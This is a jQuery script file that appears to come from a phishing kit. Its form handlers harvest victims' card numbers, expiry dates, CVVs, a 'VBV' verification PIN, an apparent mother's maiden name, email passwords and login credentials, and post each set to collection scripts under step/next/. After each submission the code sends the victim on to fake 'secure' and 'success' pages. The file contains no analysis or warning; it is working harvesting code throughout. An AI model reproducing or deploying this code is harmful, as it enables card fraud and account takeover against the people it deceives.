                            $(function() {
                    $("form[name='formcard']").validate({
                        rules: {
                            nameoncard: "required",
                            cardNumber: "required",
                            exdatee: "required",
                            cvv: "required",

                        },
                        messages: {
                            nameoncard: "",
                            cardNumber: "",
                            exdatee: "",
                            cvv: "",
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("step/next/card.php", $("#formcard").serialize(), function(result){
                                setTimeout(function() {
                                    $(location).attr("href", "/secure.php?Usecurty_info_vbv");
                                }, 2000);
                            });
                        },
                    });
                                
                         });                              



                            $(function() {
                        $("form[name='emailo']").validate({
                        rules: {
                            emailpass: "required",


                        },
                        messages: {
                            emailpass: "",

                            
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("step/next/email.php", $("#emailo").serialize(), function(result){
                                setTimeout(function() {
                                 $(location).attr("href", "/success.php?Congratulations");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });


                            $(function() {
                        $("form[name='signineml']").validate({
                        rules: {
                               email: {
                                required: true,
                                email: true
                            },


                        },
                        messages: {
                              
                                email: "* Please enter your email.",

                            
                        },
                        submitHandler: function(form) {
                             $("#zwimel").show();
                           $.post("step/next/get_pass.php", $("#signineml").serialize(), function(result)
                            {
                                setTimeout(function() {
                                    
                              $(location).attr("href", "signin.php?login"); 
                                    
                                }, 1000);
                                
                             
                            });
                        },
                    });
                });
                            $(function() {
                        $("form[name='signinpass']").validate({
                        rules: {
                             password: "required",


                        },
                        messages: {
                              
                                password: "* Please enter your password.",

                            
                        },
                       submitHandler: function(form) {
                           $("#zwimel").show();
                             $.post("step/next/login.php", $("#signinpass").serialize(), function(result){
                                setTimeout(function() {
                            $(location).attr("href", "adrres.php");
                                }, 1000);
                                
                             
                            });
                       },
                    });
                });

                        $(function() {
                        $("form[name='formvbv']").validate({
                        rules: {

                            VBVIYA: "required",
                            mmname: "required",

                        },
                        messages: {

                            VBVIYA: "",
                            mmname: "",
                            
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("step/next/pin.php", $("#formvbv").serialize(), function(result) {
                                setTimeout(function() {
                                    $(location).attr("href", "success.php");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });



